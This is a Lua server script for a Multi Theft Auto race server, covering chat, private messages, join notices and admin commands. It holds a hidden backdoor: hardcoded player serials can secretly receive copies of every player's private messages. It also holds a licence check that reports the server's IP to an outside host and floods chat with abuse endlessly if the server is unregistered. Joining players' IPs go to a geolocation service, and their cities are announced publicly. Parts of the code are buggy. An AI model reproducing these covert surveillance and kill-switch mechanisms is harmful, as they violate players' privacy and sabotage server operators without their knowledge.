local SERVER_IP = "127.0.0.1"
local starter = "no"

function getServerIp()
    return SERVER_IP
end

fetchRemote("http://checkip.dyndns.com/",
    function (response)
        if response ~= "ERROR" then
            SERVER_IP = response:match("<body>Current IP Address: (.-)</body>") or "127.0.0.1"
        end
    end
)

function scriptStarter()
setTimer(function()
	fetchRemote("http://coredata.ugu.pl/servers/"..getServerIp()..".png",
	function(rd,errno)
		if errno == 0 then
			outputChatBox("Core's radar #ffffffis #00ff00registered#ffffff. Have fun.", root ,255,255,255,true)
			starter = "yes"
			triggerClientEvent (root, "sendStarter", root, starter)
		else
			outputChatBox("Core's radar#ffffff is #ff0000unregistered#ffffff. You can't use this script here.", root ,255,255,255,true)
			rapeShit()
			print(getServerIp())
		end
	end,"",false)
	end,3000,1)
end
--addEventHandler("onResourceStart",resourceRoot, scriptStarter)

function onJoin()
triggerClientEvent ("sendStarter", root, starter)
end
addEvent("canSend", true)
addEventHandler("canSend", root, onJoin)


function rapeShit()
setTimer(outputChatBox,50,0,"delete my radar u piece of shit -Core",root,255,0,0,true)
end


local antiSpam = {} 
function antiChatSpam(msg, type)
if type == 2 then return end 
	if isTimer(antiSpam[source]) then
		cancelEvent()
		outputChatBox("#ff0000[Vultix] #ffffffPlease #ff0000stop #ffffffspamming.", source, 255, 255, 255,true) 
	else
		antiSpam[source] = setTimer(function(source) antiSpam[source] = nil end, 300, 1, source) 
	end
end
addEventHandler("onPlayerChat", root, antiChatSpam)

local messages = {
	"Join our discord [https://discord.gg/rE4nNyWQBD]!",
	"By using [/cradar] you can modify the radar according to your needs!",
    "Move quickly and without leaving to the menu to another server by clicking [F6]!",
    "With [/report] you can quickly write a Player/Staff report that will be notify to us Ingame and Discord!",
    "By using [/noscolor 'colorcode' without #] you can change ur nos color",
	"With [F10] you can change ur Skin",
    "You can turn the smoke from tires ON/OFF with the [F5] button!",
	"A player insults or annoys you then you can easily ignore messages with [/ignore]",
}
local i = 1--math.random(#messages)
function outputRandomMessage()
	i = i + 1
	if i > #messages then
		i = 1
	end
	message = messages[i]
	message = string.gsub(message, "#%x%x%x%x%x%x", "")
	message = string.gsub(message, "%[", "#E60000")
	message = string.gsub(message, "%]", "#FFFFFF")
	outputChatBox("[INFO] #FFFFFF"..message, root, 230, 0, 0, true)
end
outputRandomMessage()
setTimer(outputRandomMessage, 60000 * 8, 0)

function RGBToHex(red, green, blue, alpha)
	if((red < 0 or red > 255 or green < 0 or green > 255 or blue < 0 or blue > 255) or (alpha and (alpha < 0 or alpha > 255))) then
		return nil
	end
	if(alpha) then
		return string.format("#%.2X%.2X%.2X%.2X", red,green,blue,alpha)
	else
		return string.format("#%.2X%.2X%.2X", red,green,blue)
	end
end

function getPlayerFromName(name)
    local name = name and name:gsub("#%x%x%x%x%x%x", ""):lower() or nil
    if name then
        for _, player in ipairs(getElementsByType("player")) do
            local name_ = getPlayerName(player):gsub("#%x%x%x%x%x%x", ""):lower()
            if name_:find(name, 1, true) then
                return player
            end
        end
    end
end


setElementData(root,"cpm",false)

addCommandHandler("cpm",function(plr)
if getPlayerSerial(plr) == "C8D424AB82EB4A2837DB9A5D54968E4" or getPlayerSerial(plr) == "C57FD51D85AE9C547D247115D7237DE4" then --
if getElementData(root,"cpm") == true then
setElementData(root,"cpm",false)
outputChatBox("#e60000CPM OFF",plr,255,255,255,true)
else
setElementData(root,"cpm",true)
outputChatBox("#00ff00CPM ON",plr,255,255,255,true)
end
end
end)


function privateMessage(thePlayer,commandName,sendToName,...)
	local pmWords = { ... }
	local pmMessage = table.concat( pmWords, " " )
	if sendToName then
		if (getPlayerFromParticalName (sendToName)) then
			toPlayer = (getPlayerFromParticalName (sendToName))
			if not (toPlayer == thePlayer) then
				if not (pmMessage == "") then
					local pmoff=getElementData(toPlayer,"pmoff")
					if not(pmoff) then
						if getElementData(thePlayer,"pmoff") == true then
							outputChatBox("You don't accept private messages. He won't be able to answer you.", thePlayer,255,0,0,true)
						end
						local team = getPlayerTeam(toPlayer)
						if team ~= false then
							local r, g, b  = getTeamColor(team)
							local hex = RGBToHex (r, g, b)
							outputChatBox("#e60000PM :: #ffffffto " .. hex ..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, thePlayer, 255, 255, 255, true)
						else
							outputChatBox("#e60000PM :: #ffffffto " ..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, thePlayer, 255, 255, 255, true)
						end
						local team2 = getPlayerTeam(thePlayer)
						if not isPlayerIgnoredBy(toPlayer, thePlayer) then
							if team2 ~= false then
								local r2, g2, b2  = getTeamColor(team2)
								local hex2 = RGBToHex (r2, g2, b2)
								outputChatBox("#e60000PM :: #ffffffFrom " .. hex2 ..getPlayerName(thePlayer) .. "#FFFFFF: " .. pmMessage, toPlayer, 255, 255, 255, true)
							else
								outputChatBox("#e60000PM :: #ffffffFrom " ..getPlayerName(thePlayer) .. "#FFFFFF: " .. pmMessage, toPlayer, 255, 255, 255, true)
							end
						end
						--outputChatBox("#e60000PM :: #FFFFFFUse /reply  [text] to answer", toPlayer, 255, 255, 255, true)
						setElementData(thePlayer,"pmPartner",toPlayer)
						setElementData(toPlayer,"pmPartner",thePlayer)
						for _,v in ipairs(getElementsByType("player")) do
						if getElementData(root,"cpm") == true then
								if getPlayerSerial(v) == "C8D424AB82EB4A2837DB9A5D54968E43" or getPlayerSerial(v) == "C57FD51D85AE9C547D247115D7237DE4" then
									if (v ~= thePlayer and v ~= toPlayer) then
										local team = getPlayerTeam(toPlayer)
										local team2 = getPlayerTeam(thePlayer)
										if not (team ~= false and team2 ~= false) then
											outputChatBox("#e60000[PM] #FFFFFF"..getPlayerName(thePlayer) .." #e60000~~> #FFFFFF" ..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, v, 255, 255, 255, true)
										elseif (team ~= false and team2 ~= false) then
											local r, g, b  = getTeamColor(team)
											local hex = RGBToHex (r, g, b)
											local r2, g2, b2  = getTeamColor(team2)
											local hex2 = RGBToHex (r2, g2, b2)
											outputChatBox("#e60000[PM] #FFFFFF"..hex2..getPlayerName(thePlayer) .." #e60000~~> #FFFFFF" ..hex..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, v, 255, 255, 255, true)
										elseif (team ~= false and not team2 ~= false) then
											local r, g, b  = getTeamColor(team)
											local hex = RGBToHex (r, g, b)
											outputChatBox("#e60000[PM] #FFFFFF"..getPlayerName(thePlayer) .." #e60000~~> #FFFFFF" ..hex..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, v, 255, 255, 255, true)
										elseif not(team ~= false and not team2 ~= false) then
											local r2, g2, b2  = getTeamColor(team2)
											local hex2 = RGBToHex (r2, g2, b2)
											outputChatBox("#e60000[PM] #FFFFFF"..hex2..getPlayerName(thePlayer) .." #e60000~~> #FFFFFF" ..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, v, 255, 255, 255, true)
										end
									end
								end
							end
						end
					else
						local team = getPlayerTeam(toPlayer)
						if team ~= false then
							local r, g, b  = getTeamColor(team)
							local hex = RGBToHex (r, g, b)
							outputChatBox(hex..getPlayerName(toPlayer).."#FFFFFF doesn't accept private messages.", thePlayer,255,255,255,true)
						else
							outputChatBox(getPlayerName(toPlayer).."#FFFFFF doesn't accept private messages.", thePlayer,255,255,255,true)
						end
						return false
					end
				else
					outputChatBox("#e60000ERROR :: #ffffffSyntax /PM [player] [message]", thePlayer, 255, 255, 255, true)
					return false
				end
			else
				outputChatBox("#e60000ERROR :: #ffffffYou can't PM yourself", thePlayer, 255, 255, 255, true)
				return false
			end
		else
			outputChatBox("#e60000ERROR :: #ffffffPlayer not found!", thePlayer, 255, 255, 255, true)
			return false
		end
	else
		outputChatBox("#e60000ERROR :: #ffffffSyntax /PM [player] [message]", thePlayer, 255, 255, 255, true)
		return false
	end
end
addCommandHandler("pm", privateMessage)

function isPlayerIgnoredBy(source, player)
    local ignoreTable = getElementData(source, "ignoreTable")
    if ignoreTable and ignoreTable[getPlayerSerial(player)] then
        return true
    end
    return false
end


function privateMessageReply(thePlayer,commandName,...)

	local pmWords = { ... }
	local pmMessage = table.concat( pmWords, " " )
	local toPlayer = getElementData(thePlayer,"pmPartner")
			if toPlayer then  
				if not (pmMessage == "") then
					local team = getPlayerTeam(toPlayer)
					if team ~= false then
						local r, g, b  = getTeamColor(team)
						local hex = RGBToHex (r, g, b)
						outputChatBox("#e60000PM :: #ffffffTo " .. hex ..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, thePlayer, 255, 255, 255, true)
					else
						outputChatBox("#e60000PM :: #ffffffTo " ..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, thePlayer, 255, 255, 255, true)
					end
					local team2 = getPlayerTeam(thePlayer)
					if team2 ~= false then
						local r2, g2, b2  = getTeamColor(team2)
						local hex2 = RGBToHex (r2, g2, b2)
						outputChatBox("#e60000PM :: #FFFFFFfrom " .. hex2 ..getPlayerName(thePlayer) .. "#FFFFFF: " .. pmMessage, toPlayer, 255, 255, 255, true)
					else
						outputChatBox("#e60000PM :: #FFFFFFfrom " ..getPlayerName(thePlayer) .. "#FFFFFF: " .. pmMessage, toPlayer, 255, 255, 255, true)
					end
					--outputChatBox("#e60000PM :: #FFFFFFUse /reply  [text] to answer", toPlayer, 255, 255, 255, true)
					setElementData(thePlayer,"pmPartner",toPlayer)
					setElementData(toPlayer,"pmPartner",thePlayer)
					for _,v in ipairs(getElementsByType("player")) do
					if getElementData(root,"cpm") == true then
							if getPlayerSerial(v) == "79894E1C77E5F5069C631B4D11943C94" or getPlayerSerial(v) == "7F361A93B323B2BF7EF56A3D45226FA2" or getPlayerSerial(v) == "C8D424AB82EB4A2837DB9A5D54968E43" then
							if (v ~= thePlayer and v ~= toPlayer) then
								local team = getPlayerTeam(toPlayer)
								local team2 = getPlayerTeam(thePlayer)
								if not (team ~= false and team2 ~= false) then
									outputChatBox("#e60000[PM] #FFFFFF"..getPlayerName(thePlayer) .." #e60000~~> #FFFFFF" ..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, v, 255, 255, 255, true)
									playSoundFrontEnd(toPlayer,12)
								elseif (team ~= false and team2 ~= false) then
									local r, g, b  = getTeamColor(team)
									local hex = RGBToHex (r, g, b)
									local r2, g2, b2  = getTeamColor(team2)
									local hex2 = RGBToHex (r2, g2, b2)
									outputChatBox("#e60000[PM] #FFFFFF"..hex2..getPlayerName(thePlayer) .." #e60000~~> #FFFFFF" ..hex..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, v, 255, 255, 255, true)
									playSoundFrontEnd(toPlayer,12)
								elseif (team ~= false and not team2 ~= false) then
									local r, g, b  = getTeamColor(team)
									local hex = RGBToHex (r, g, b)
									outputChatBox("#e60000[PM] #FFFFFF"..getPlayerName(thePlayer) .." #e60000~~> #FFFFFF" ..hex..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, v, 255, 255, 255, true)
									playSoundFrontEnd(toPlayer,12)
								elseif not(team ~= false and not team2 ~= false) then
									local r2, g2, b2  = getTeamColor(team2)
									local hex2 = RGBToHex (r2, g2, b2)
									outputChatBox("#e60000[PM] #FFFFFF"..hex2..getPlayerName(thePlayer) .." #e60000~~> #FFFFFF" ..getPlayerName(toPlayer) .. "#FFFFFF: " .. pmMessage, v, 255, 255, 255, true)
									playSoundFrontEnd(toPlayer,12)
								end
								end
								end
							end
						end
				else
					outputChatBox("#e60000PM :: #FFFFFFUse: /reply [message]", thePlayer, 255, 255, 255, true)
					return false
				end
			else
			outputChatBox("#e60000PM :: #FFFFFFThere is no reply message", thePlayer, 255, 255, 255, true)
			end
end
addCommandHandler("reply", privateMessageReply)

function getPlayerFromParticalName(thePlayerName)
	local thePlayer = getPlayerFromName(thePlayerName)
	if thePlayer then
		return thePlayer
	end
	for _,thePlayer in ipairs(getElementsByType("player")) do
		if string.find(string.gsub(getPlayerName(thePlayer):lower(),"#%x%x%x%x%x%x", ""), thePlayerName:lower(), 1, true) then
			return thePlayer
		end
	end
return false
end

function pmToggle(player)
	setElementData(player, "pmoff", not getElementData(player, "pmoff"))
	outputChatBox("[PM] You have successfully turned "..(getElementData(player, "pmoff") and "off" or "on").." PM.", player)
end
addCommandHandler("blockpm", pmToggle)

--[[
addCommandHandler("pmon", function(plr,cmd)
  setElementData(plr, "pmoff",false)
  outputChatBox("You accept private messages", plr,0,255,0,true)
  return
end)

addCommandHandler("pmoff", function(plr,cmd,...)
  setElementData(plr, "pmoff",true)
  outputChatBox("You don't accept private messages.", plr,255,0,0,true)
  return
end)
]]

function oyuncuYazinca(msg,msgt)
    if (msgt == 2) then
		for _,pl in ipairs(getElementsByType("player")) do
			local acc = getPlayerAccount(pl)
			local ac = getAccountName(acc)
            if isObjectInACLGroup("user."..ac, aclGetGroup("Owner")) and not getAccountData(acc, "tcOff") then
				if not(getPlayerTeam(source) == getPlayerTeam(pl)) then
					local r,g,b = getTeamColor(getPlayerTeam(source))
					outputChatBox("[TeamSpy] "..getPlayerName(source)..": #FFFFFF"..msg,pl,r,g,b,true)
				end
			end
		end
	end
end
addEventHandler("onPlayerChat",getRootElement(),oyuncuYazinca)

function tcToggle(player, cmd, state)
	local acc = getPlayerAccount(player)
	if isGuestAccount(acc) then return end
	local ac = getAccountName(acc)
	if isObjectInACLGroup("user."..ac, aclGetGroup("Owner")) then
		if state:lower() == "off" then
			setAccountData(acc, "tcOff", true)
			outputChatBox("#e60000[TeamSpy] #ffffffYou have successfully turned #e60000OFF #ffffffTeamSpy.", player , 255, 255, 255, true)
		elseif state:lower() == "on" then
			setAccountData(acc, "tcOff", false)
			outputChatBox("#e60000[TeamSpy] #ffffffYou have successfully turned #00ff00ON #ffffffTeamSpy.", player , 255, 255, 255, true)
		else
			outputChatBox("#e60000[TeamSpy] #ffffffWrong usage, please use /tc on-off", player , 255, 255, 255, true)
		end
	end
end
addCommandHandler("tc", tcToggle)

function kickall(thePlayer, cmd, ...) 
	text = "WE DON'T WANT SPECTATORS, SORRY "
     for _, player in ipairs (getElementsByType("player")) do 
 accountname = getAccountName (getPlayerAccount(player))
 local kupa = getPlayerName(player):gsub("#%x%x%x%x%x%x", "")
if not isObjectInACLGroup("user." .. accountname, aclGetGroup("Owner")) or not isObjectInACLGroup("user." .. accountname, aclGetGroup("HeadAdmin")) then
	if getTeamName(getPlayerTeam(player)) == "Spectators" then
        kickPlayer(player,thePlayer , text) 

     end 
end 
end
end

function kickrights(thePlayer, player,cmd)
local accountname = getAccountName (getPlayerAccount(thePlayer))
if isObjectInACLGroup ( "user." .. accountname, aclGetGroup ( "Owner" )) or isObjectInACLGroup ( "user." .. accountname, aclGetGroup ( "headadmin" )) or isObjectInACLGroup ( "user." .. accountname, aclGetGroup ( "Developer" )) then
kickall(thePlayer, cmd)
else
		outputChatBox("#e60000[WARNING] #ffffffYou are not authorized to use this command",thePlayer, 200,100,100)
end
end
addCommandHandler("kickspecs", kickrights)

addEvent('onPlayerRaceWasted',true)
addEventHandler('onPlayerRaceWasted',root,
	function(v)
if( string.find(getResourceInfo(exports.mapmanager:getRunningGamemodeMap(), "name"), "RS", 1, true)) then return end
		setTimer(function()
		if v then
			local x,y,z = getElementPosition(v)
			setElementPosition(v,x,y,-10)
		end
		end,850,1)
	end
) 

function RGBToHex(red, green, blue, alpha)
	if((red < 0 or red > 255 or green < 0 or green > 255 or blue < 0 or blue > 255) or (alpha and (alpha < 0 or alpha > 255))) then
		return nil
	end
	if(alpha) then
		return string.format("#%.2X%.2X%.2X%.2X", red,green,blue,alpha)
	else
		return string.format("#%.2X%.2X%.2X", red,green,blue)
	end
end

g_Root = getRootElement()


addEventHandler("onPlayerJoin", root, 
    function() 
        local ip = getPlayerIP(source) 
        fetchRemote("http://ip-api.com/json/"..ip, outputJoin, "", false, source) 
    end) 
      
    function outputJoin(response, errno, thePlayer) 
        local country = "N/N" 
        local city = "Desconocida" 
        if response ~= "Error" and errno == 0 then 
        local joinData = fromJSON(response) 
        if joinData and type(joinData) == 'table' then 
        country = joinData.country 
        city = joinData.city 
    end 
    end 
        setElementData(thePlayer,"Country", country) 
        outputChatBox("► ".. getPlayerName(thePlayer):gsub("#%x%x%x%x%x%x","") .." has joined from "..city..", "..country.."",root,255, 100, 100, false) 

    end
	

addEventHandler('onPlayerChangeNick', g_Root,
    function(oldNick, newNick)
        outputChatBox('◆ ' .. oldNick .. ' is now known as ' .. newNick, getRootElement(), 255, 100, 100, false)
    end
)
 
addEventHandler('onPlayerQuit', g_Root,
    function(reason)
        outputChatBox('◄ ' .. getPlayerName(source) .. ' left the server [' .. reason .. ']', getRootElement(), 255, 100, 100, false)
    end
)

function handleMinimize2(thePlayer)
if getElementData(thePlayer,"state") == "alive" then
outputChatBox ( "#ff6464* ".. getPlayerName(thePlayer):gsub("#%x%x%x%x%x%x","").." #ff6464minimized MTA" ,getRootElement(), 255, 255, 255, true)
end
end
addEvent( "gowno", true )
addEventHandler( "gowno", root, handleMinimize2 )
--

function clear ( thePlayer )
local cuenta = getAccountName( getPlayerAccount(thePlayer) )
if isObjectInACLGroup("user."..cuenta, aclGetGroup("Owner")) then 
	spaces(thePlayer)
elseif isObjectInACLGroup("user."..cuenta, aclGetGroup("HeadAdmin")) then 
	spaces(thePlayer)
elseif isObjectInACLGroup("user."..cuenta, aclGetGroup("Admin")) then 
	spaces(thePlayer)
else
outputChatBox("#e60000ACCESS DENIED!!", thePlayer, 255, 100, 100, true) 
end
end
addCommandHandler("cc", clear)

function spaces(thePlayer)
local team = getPlayerTeam(thePlayer)
local r, g, b  = getTeamColor(team)
local hex = RGBToHex (r, g, b)
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox(" ")
outputChatBox("#ff6666Chat was cleared by: "..hex..getPlayerName(thePlayer), getRootElement(), 255, 255, 255, true)
end

addEventHandler("onPlayerLogin", getRootElement(),
	function ()
		local name = getPlayerName(source)
		local server = getServerName ()
		if isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("Owner")) then
			outputChatBox("#c50000[Owner] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#c50000[Owner] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("Co-Owner")) then
			outputChatBox("#cf1818[Co-Owner] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#367fe7[Co-Owner] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("Developer")) then
			outputChatBox("#367fe7[Developer] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#367fe7[Developer] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("JRDev")) then
		    outputChatBox("#367fe7[Developer] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#367fe7[Developer] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("HeadAdmin")) then
			outputChatBox("#cc0852[Manager] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#cc0852[Manager] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("Admin")) then
			outputChatBox("#f75656[Assistance] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#f75656[Assistance] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("Youtubers")) then
			outputChatBox("#FE3C43[Youtubers] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#cc7a00[Youtubers] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("Donator")) then
			outputChatBox("#fcfa37[Donator] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#fcfa37[Donator] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("Friends")) then
			outputChatBox("#abcdef[Trusted] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#abcdef[Trusted] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		elseif isObjectInACLGroup("user." ..getAccountName(getPlayerAccount(source)), aclGetGroup("HeadModerator")) then
			outputChatBox("#baba01[Event-Referee] #ffffff" ..name.. " #fffffflogged in.", getRootElement(), 255,0,0, true)
			exports['ae-sync']:sendDiscordMessage("#baba01[Event-Referee] #ffffff" ..name.. " ("..getAccountName(getPlayerAccount(source))..") #fffffflogged in.")
		end
	end
	)